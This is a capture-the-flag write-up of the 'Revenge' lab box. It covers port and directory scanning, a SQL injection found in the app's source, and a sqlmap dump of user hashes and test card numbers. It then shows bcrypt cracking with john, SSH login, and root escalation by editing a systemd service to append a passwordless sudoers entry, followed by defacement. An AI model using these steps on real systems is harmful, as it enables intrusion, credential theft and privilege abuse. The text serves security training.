# Revenge
Enumerating the service with nmap yields:
```
➜  nmap -sV -p- 10.10.157.207
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-29 17:09 CET
Nmap scan report for 10.10.157.207
Host is up (0.13s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.65 seconds
```
Enumerating the service running on port 80 with gobuster yields:
```
➜  gobuster dir --url http://10.10.32.203/ --wordlist=/home/emil/KaliLists/dirbuster/directory-list-2.3-medium.txt -t 200 -x py,txt,php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:            http://10.10.32.203/
[+] Method:         GET
[+] Threads:        200
[+] Wordlist:       /home/emil/KaliLists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.1.0
[+] Extensions:     py,txt,php
[+] Timeout:        10s
===============================================================
2020/12/29 17:48:23 Starting gobuster in directory enumeration mode
===============================================================
/contact (Status: 200)        
/products (Status: 200)       
/static (Status: 301)         
/admin (Status: 200)          
/index (Status: 200)          
/login (Status: 200)          
/app.py (Status: 200)         
/requirements.txt (Status: 200)

===============================================================
2020/12/29 18:05:30 Finished
===============================================================
```
A file called `app.py`, we might be able to spot some vulnerabilities by loking at that.
In the file theres a function called product.
```
# Product Route

# SQL Query performed here

@app.route('/products/<product_id>', methods=['GET'])

def product(product_id):

    with eng.connect() as con:

        # Executes the SQL Query

        # This should be the vulnerable portion of the application

        rs = con.execute(f"SELECT * FROM product WHERE id={product_id}")

        product_selected = rs.fetchone()  # Returns the entire row in a list

    return render_template('product.html', title=product_selected[1], result=product_selected)
```
Other than the obvious comment `# This should be the vulnerable portion of the application`,
we can see that this is exploitable because the URI parameter isn't sanitized.

Exploiting this vulnerability with `sqlmap` yields:
```
➜  sqlmap -u "http://10.10.178.206/products/1*" --batch --risk 3 --level 5 --dump
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.4.9#stable}
|_ -| . ["]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:15:51 /2020-12-29/

custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y
[18:15:51] [INFO] resuming back-end DBMS 'mysql'
[18:15:51] [INFO] testing connection to the target URL
[18:15:51] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: http://10.10.178.206:80/products/1 AND 1379=1379

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: http://10.10.178.206:80/products/1 AND (SELECT 3813 FROM (SELECT(SLEEP(5)))Xtrh)

    Type: UNION query
    Title: Generic UNION query (NULL) - 8 columns
    Payload: http://10.10.178.206:80/products/-9141 UNION ALL SELECT 97,97,CONCAT(0x7176717871,0x61655761444f484e5447614354597971556b485a74444c704e46517a6c644c4350726351676c484e,0x716b707a71),97,97,97,97,97-- -
---
[18:15:51] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[18:15:51] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[18:15:51] [INFO] fetching current database
[18:15:51] [INFO] fetching tables for database: 'duckyinc'
[18:15:52] [INFO] retrieved: 'product'
[18:15:52] [INFO] retrieved: 'system_user'
[18:15:52] [INFO] retrieved: 'user'
[18:15:52] [INFO] fetching columns for table 'user' in database 'duckyinc'                            
[18:15:52] [INFO] retrieved: 'id','int(11)'
[18:15:53] [INFO] retrieved: 'username','varchar(64)'
[18:15:53] [INFO] retrieved: '_password','varchar(128)'
[18:15:53] [INFO] retrieved: 'credit_card','varchar(26)'
[18:15:53] [INFO] retrieved: 'email','varchar(120)'
[18:15:53] [INFO] retrieved: 'company','varchar(50)'
[18:15:53] [INFO] fetching entries for table 'user' in database 'duckyinc'                            
[18:15:53] [INFO] retrieved: '$2a$12$dAV7fq4KIUyUEOALi8P2dOuXRj5ptOoeRtYLHS85vd/SBDv.tYXOa','Fake In...
[18:15:53] [INFO] retrieved: '$2a$12$6KhFSANS9cF6riOw5C66nerchvkU9AHLVk7I8fKmBkh6P/rPGmanm','Evil Co...
[18:15:53] [INFO] retrieved: '$2a$12$9VmMpa8FufYHT1KNvjB1HuQm9LF8EX.KkDwh9VRDb5hMk3eXNRC4C','McDoona...
[18:15:54] [INFO] retrieved: '$2a$12$LMWOgC37PCtG7BrcbZpddOGquZPyrRBo5XjQUIVVAlIKFHMysV9EO','ABC Cor...
[18:15:54] [INFO] retrieved: '$2a$12$hEg5iGFZSsec643AOjV5zellkzprMQxgdh1grCW3SMG9qV9CKzyRu','Three B...
[18:15:54] [INFO] retrieved: '$2a$12$reNFrUWe4taGXZNdHAhRme6UR2uX..t/XCR6UnzTK6sh1UhREd1rC','Krasco ...
[18:15:54] [INFO] retrieved: '$2a$12$8IlMgC9UoN0mUmdrS3b3KO0gLexfZ1WvA86San/YRODIbC8UGinNm','Wally W...
[18:15:54] [INFO] retrieved: '$2a$12$dmdKBc/0yxD9h81ziGHW4e5cYhsAiU4nCADuN0tCE8PaEv51oHWbS','Orlando...
[18:15:54] [INFO] retrieved: '$2a$12$q6Ba.wuGpch1SnZvEJ1JDethQaMwUyTHkR0pNtyTW6anur.3.0cem','Dolla T...
[18:15:54] [INFO] retrieved: '$2a$12$gxC7HlIWxMKTLGexTq8cn.nNnUaYKUpI91QaqQ/E29vtwlwyvXe36','O!  Fam...
Database: duckyinc                                                                                    
Table: user
[10 entries]
+----+---------------------------------+------------------+----------+--------------------------------------------------------------+----------------------------+
| id | email                           | company          | username | _password                                                    | credit_card                |
+----+---------------------------------+------------------+----------+--------------------------------------------------------------+----------------------------+
| 1  | sales@fakeinc.org               | Fake Inc         | jhenry   | $2a$12$dAV7fq4KIUyUEOALi8P2dOuXRj5ptOoeRtYLHS85vd/SBDv.tYXOa | 4338736490565706           |
| 2  | accountspayable@ecorp.org       | Evil Corp        | smonroe  | $2a$12$6KhFSANS9cF6riOw5C66nerchvkU9AHLVk7I8fKmBkh6P/rPGmanm | 355219744086163            |
| 3  | accounts.payable@mcdoonalds.org | McDoonalds Inc   | dross    | $2a$12$9VmMpa8FufYHT1KNvjB1HuQm9LF8EX.KkDwh9VRDb5hMk3eXNRC4C | 349789518019219            |
| 4  | sales@ABC.com                   | ABC Corp         | ngross   | $2a$12$LMWOgC37PCtG7BrcbZpddOGquZPyrRBo5XjQUIVVAlIKFHMysV9EO | 4499108649937274           |
| 5  | sales@threebelow.com            | Three Below      | jlawlor  | $2a$12$hEg5iGFZSsec643AOjV5zellkzprMQxgdh1grCW3SMG9qV9CKzyRu | 4563593127115348           |
| 6  | ap@krasco.org                   | Krasco Org       | mandrews | $2a$12$reNFrUWe4taGXZNdHAhRme6UR2uX..t/XCR6UnzTK6sh1UhREd1rC | <REDACTED> |
| 7  | payable@wallyworld.com          | Wally World Corp | dgorman  | $2a$12$8IlMgC9UoN0mUmdrS3b3KO0gLexfZ1WvA86San/YRODIbC8UGinNm | 4905698211632780           |
| 8  | payables@orlando.gov            | Orlando City     | mbutts   | $2a$12$dmdKBc/0yxD9h81ziGHW4e5cYhsAiU4nCADuN0tCE8PaEv51oHWbS | 4690248976187759           |
| 9  | sales@dollatwee.com             | Dolla Twee       | hmontana | $2a$12$q6Ba.wuGpch1SnZvEJ1JDethQaMwUyTHkR0pNtyTW6anur.3.0cem | 375019041714434            |
| 10 | sales@ofamdollar                | O!  Fam Dollar   | csmith   | $2a$12$gxC7HlIWxMKTLGexTq8cn.nNnUaYKUpI91QaqQ/E29vtwlwyvXe36 | 364774395134471            |
+----+---------------------------------+------------------+----------+--------------------------------------------------------------+----------------------------+

[18:15:54] [INFO] table 'duckyinc.`user`' dumped to CSV file '/home/emil/.local/share/sqlmap/output/10.10.178.206/dump/duckyinc/user.csv'
[18:15:54] [INFO] fetching columns for table 'system_user' in database 'duckyinc'
[18:15:54] [INFO] retrieved: 'id','int(11)'
[18:15:55] [INFO] retrieved: 'username','varchar(64)'
[18:15:55] [INFO] retrieved: '_password','varchar(128)'
[18:15:55] [INFO] retrieved: 'email','varchar(120)'
[18:15:55] [INFO] fetching entries for table 'system_user' in database 'duckyinc'                     
[18:15:55] [INFO] retrieved: '$2a$08$GPh7KZcK2kNIQEm5byBj1umCQ79xP.zQe19hPoG/w2GoebUtPfT8a','sadmin@...
[18:15:55] [INFO] retrieved: '$2a$12$LEENY/LWOfyxyCBUlfX8Mu8viV9mGUse97L8x.4L66e9xwzzHfsQa','kmotley...
[18:15:55] [INFO] retrieved: '$2a$12$22xS/uDxuIsPqrRcxtVmi.GR2/xh0xITGdHuubRF4Iilg5ENAFlcK','dhughes...
Database: duckyinc                                                                                    
Table: system_user
[3 entries]
+----+----------------------+--------------+--------------------------------------------------------------+
| id | email                | username     | _password                                                    |
+----+----------------------+--------------+--------------------------------------------------------------+
| 1  | sadmin@duckyinc.org  | server-admin | $2a$08$GPh7KZcK2kNIQEm5byBj1umCQ79xP.zQe19hPoG/w2GoebUtPfT8a |
| 2  | kmotley@duckyinc.org | kmotley      | $2a$12$LEENY/LWOfyxyCBUlfX8Mu8viV9mGUse97L8x.4L66e9xwzzHfsQa |
| 3  | dhughes@duckyinc.org | dhughes      | $2a$12$22xS/uDxuIsPqrRcxtVmi.GR2/xh0xITGdHuubRF4Iilg5ENAFlcK |
+----+----------------------+--------------+--------------------------------------------------------------+

[18:15:55] [INFO] table 'duckyinc.`system_user`' dumped to CSV file '/home/emil/.local/share/sqlmap/output/10.10.178.206/dump/duckyinc/system_user.csv'
[18:15:55] [INFO] fetching columns for table 'product' in database 'duckyinc'
[18:15:55] [INFO] retrieved: 'id','int(11)'
[18:15:56] [INFO] retrieved: 'name','varchar(64)'
[18:15:56] [INFO] retrieved: 'price','decimal(10,2)'
[18:15:56] [INFO] retrieved: 'cost','decimal(10,2)'
[18:15:56] [INFO] retrieved: 'image_url','varchar(64)'
[18:15:56] [INFO] retrieved: 'color_options','varchar(64)'
[18:15:56] [INFO] retrieved: 'in_stock','varchar(1)'
[18:15:56] [INFO] retrieved: 'details','varchar(360)'
[18:15:56] [INFO] fetching entries for table 'product' in database 'duckyinc'                         
[18:15:56] [INFO] retrieved: 'yellow','50.00','Individual boxes of duckies! Boxes are sold only in t...
[18:15:57] [INFO] retrieved: 'yellow, blue, green, red','500.00','Do you love a dozen donuts? Then y...
[18:15:57] [INFO] retrieved: 'yellow, blue, red, orange','800.00','Got lots of shelves to fill? Cust...
[18:15:57] [INFO] retrieved: 'yellow, blue','15000.00','This is it! Our largest order of duckies! Yo...
Database: duckyinc                                                                                    
Table: product
[4 entries]
+----+----------+-----------------------+----------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------+-----------------------------------+---------------------------+
| id | cost     | name                  | price    | details                                                                                                                                                                                                                                                                                                                 | in_stock | image_url                         | color_options             |
+----+----------+-----------------------+----------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------+-----------------------------------+---------------------------+
| 1  | 50.00    | Box of Duckies        | 35.00    | Individual boxes of duckies! Boxes are sold only in the yellow color. This item is eligible for FAST shipping from one of our local warehouses. If you order before 2 PM on any weekday, we can guarantee that your order will be shipped out the same day.                                                             | Y        | images/box-of-duckies.png         | yellow                    |
| 2  | 500.00   | Dozen of Duckies      | 600.00   | Do you love a dozen donuts? Then you'll love a dozen boxes of duckies! This item is not eligible for FAST shipping. However, orders of this product are typically shipped out next day, provided they are ordered prior to 2 PM on any weekday.                                                                         | N        | images/dozen-boxes-of-duckies.png | yellow, blue, green, red  |
| 3  | 800.00   | Pallet of Duckies     | 1000.00  | Got lots of shelves to fill? Customers that want their duckies? Look no further than the pallet of duckies! This baby comes with 20 boxes of duckies in the colors of your choosing. Boxes can only contain one color ducky but multiple colors can be selected when you call to order. Just let your salesperson know. | N        | images/pallet.png                 | yellow, blue, red, orange |
| 4  | 15000.00 | Truck Load of Duckies | 22000.00 | This is it! Our largest order of duckies! You mean business with this order. You must have a ducky emporium if you need this many duckies. Due to the logistics with this type of order, FAST shipping is not available.\r\n\r\nActual truck not pictured.                                                              | Y        | images/truckload.png              | yellow, blue              |
+----+----------+-----------------------+----------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------+-----------------------------------+---------------------------+

[18:15:57] [INFO] table 'duckyinc.product' dumped to CSV file '/home/emil/.local/share/sqlmap/output/10.10.178.206/dump/duckyinc/product.csv'
[18:15:57] [INFO] fetched data logged to text files under '/home/emil/.local/share/sqlmap/output/10.10.178.206'

[*] ending @ 18:15:57 /2020-12-29/
```
In the `user` table we find our first flag.
We can now take all these usernames and hashes and crack them with `john`.
Lets focus on the system_user.
To crack them with `john` we first we make a file called `db_pass` and throw the user:hashes in there:
```
server-admin:$2a$08$GPh7KZcK2kNIQEm5byBj1umCQ79xP.zQe19hPoG/w2GoebUtPfT8a:::::::
kmotley:$2a$12$LEENY/LWOfyxyCBUlfX8Mu8viV9mGUse97L8x.4L66e9xwzzHfsQa:::::::
dhughes:$2a$12$22xS/uDxuIsPqrRcxtVmi.GR2/xh0xITGdHuubRF4Iilg5ENAFlcK:::::::
```
Now we can run crack them:
```
➜  john --wordlist=/home/emil/KaliLists/rockyou.txt db_pass
Warning: detected hash type "bcrypt", but the string is also recognized as "bcrypt-opencl"
Use the "--format=bcrypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (bcrypt [Blowfish 32/64 X3])
Loaded hashes with cost 1 (iteration count) varying from 256 to 4096
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
<REDACTED>         (server-admin)
```
We quickly get a hit from the server-admin user.
Lets try logging into the ssh service with these credentials:
```
➜  ~ ssh server-admin@10.10.178.206
The authenticity of host '10.10.178.206 (10.10.178.206)' can't be established.
ECDSA key fingerprint is SHA256:p6l0aKeIJlyHmiqZxt/pRvjb++LAjF9jTDp4ZkSCpOk.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.178.206' (ECDSA) to the list of known hosts.
server-admin@10.10.178.206's password:
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 1.0


8 packages can be updated.
0 updates are security updates.


################################################################################
#			 Ducky Inc. Web Server 00080012			       #
#	     This server is for authorized Ducky Inc. employees only	       #
#		   All actiions are being monitored and recorded	       #
#		     IP and MAC addresses have been logged		       #
################################################################################
Last login: Wed Aug 12 20:09:36 2020 from 192.168.86.65
server-admin@duckyinc:~$
```
Awesome! We can now read the 2nd flag.
```
server-admin@duckyinc:~$ ls -la
total 44
drwxr-xr-x 5 server-admin server-admin 4096 Aug 12 18:13 .
drwxr-xr-x 3 root         root         4096 Aug 10 15:55 ..
lrwxrwxrwx 1 root         root            9 Aug 10 12:54 .bash_history -> /dev/null
-rw-r--r-- 1 server-admin server-admin  220 Aug 10 01:24 .bash_logout
-rw-r--r-- 1 server-admin server-admin 3771 Aug 10 01:24 .bashrc
drwx------ 2 server-admin server-admin 4096 Aug 10 20:37 .cache
-rw-r----- 1 server-admin server-admin   18 Aug 10 01:42 flag2.txt
drwx------ 3 server-admin server-admin 4096 Aug 10 20:37 .gnupg
-rw------- 1 root         root           31 Aug 10 17:21 .lesshst
drwxr-xr-x 3 server-admin server-admin 4096 Aug 10 01:40 .local
-rw-r--r-- 1 server-admin server-admin  807 Aug 10 01:24 .profile
-rw-r--r-- 1 server-admin server-admin    0 Aug 10 01:37 .sudo_as_admin_successful
-rw------- 1 server-admin server-admin 2933 Aug 12 18:13 .viminfo
server-admin@duckyinc:~$ cat flag2.txt
<REDACTED>
```
Checking if we can run anything as sudo we get:
```
server-admin@duckyinc:~$ sudo -l
[sudo] password for server-admin:
Matching Defaults entries for server-admin on duckyinc:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User server-admin may run the following commands on duckyinc:
    (root) /bin/systemctl start duckyinc.service, /bin/systemctl enable duckyinc.service,
        /bin/systemctl restart duckyinc.service, /bin/systemctl daemon-reload, sudoedit
        /etc/systemd/system/duckyinc.service
```
Here we see that we can edit and restart the service duckyinc as root.
If we use this to add server-admin to the sudo group we should be golden:
We'll make a small script called `priv.sh` and make it executable.
```
#!/bin/bash
echo "server-admin  ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
```
```
server-admin@duckyinc:~$ chmod +x priv.sh
```
Now we'll edit the service to execute our script as root.
```
server-admin@duckyinc:~$ sudoedit /etc/systemd/system/duckyinc.service
```
Changing the existing file to this:
```
[Unit]
Description=Gunicorn instance to serve DuckyInc Webapp
After=network.target

[Service]
User=root     
Group=root    
WorkingDirectory=/var/www/duckyinc
ExecStart=/bin/bash /home/server-admin/priv.sh
ExecReload=/bin/kill -s HUP $MAINPID
ExecStop=/bin/kill -s TERM $MAINPID

[Install]
WantedBy=multi-user.target

```
And restarting the service:
```
server-admin@duckyinc:~$ sudo /bin/systemctl daemon-reload
server-admin@duckyinc:~$ sudo /bin/systemctl enable duckyinc.service
server-admin@duckyinc:~$ sudo /bin/systemctl restart duckyinc.service
```
We can now check `sudo -l` again.
```
server-admin@duckyinc:~$ sudo -l
Matching Defaults entries for server-admin on duckyinc:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User server-admin may run the following commands on duckyinc:
    (root) /bin/systemctl start duckyinc.service, /bin/systemctl enable duckyinc.service,
        /bin/systemctl restart duckyinc.service, /bin/systemctl daemon-reload, sudoedit
        /etc/systemd/system/duckyinc.service
    (ALL) NOPASSWD: ALL
```
Sweet, we can now run all commands as all users!
We can now deface the website and read the final flag.
```
root@duckyinc:/home/server-admin# cd
root@duckyinc:~# mv /var/www/duckyinc/templates/index.html /dev/shm/
root@duckyinc:~# ls
flag3.txt
root@duckyinc:~# cat flag3.txt
<REDACTED>
```
